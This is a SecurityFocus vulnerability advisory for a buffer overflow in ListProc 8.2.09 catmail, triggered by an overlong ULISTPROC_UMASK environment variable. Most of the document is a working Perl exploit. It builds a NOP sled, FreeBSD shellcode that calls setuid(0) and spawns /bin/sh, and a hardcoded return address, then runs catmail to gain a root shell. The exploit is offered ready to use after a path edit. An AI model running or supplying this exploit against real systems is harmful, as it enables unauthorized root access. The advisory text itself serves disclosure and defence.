source: http://www.securityfocus.com/bid/7533/info

ListProc catmail has been reported prone to a buffer overflow vulnerability when handling a ULISTPROC_UMASK environment variable of excessive length.

The issue is likely due to a lack of sufficient bounds checking performed when copying the contents of the ULISTPROC_UMASK environment variable into an internal memory buffer.

Ultimately an attacker may exploit this vulnerability to execute arbitrary operation codes. Code execution would occur in the context of the ListProc catmail application, typically root.

It should be noted that while his vulnerability has been reported to affect ListProc 8.2.09, other versions might also be affected. 

#!/usr/bin/perl -w
# DSR-listproc.pl - kokaninATdtors.net vs. listproc 8.2.09 (bug found by KF)
# as per http://www.packetstormsecurity.nl/0305-advisories/srt2003-1137.txt
# offset, retaddr and shellcode is for my FreeBSD 4.8-RELEASE, YMMV
# shellcode by eSDee, hello there eSDee
# dont forget to edit the path to the catmail binary
# this yields uid(0) if listproc is installed by root, otherwise something else

$len = 16534;
$ret = pack("l",0xbfbfd176); # appx. middle of the env_var (as seen w. � eye)
$nop = "\x90";                                        
$shellcode =    "\x31\xc0\x50\x50\xb0\x17\xcd\x80\x31\xc0\x50\x68".
                "\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50".
                "\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";
                                                      
for ($i = 0; $i < $len - (length($shellcode)-8); $i++) {
    $buffer .= $nop;                                  
}                                                     
$buffer .= $shellcode;                                
$buffer .= $ret x 2;                                  
local($ENV{'ULISTPROC_UMASK'}) = $buffer;             
system("catmail");
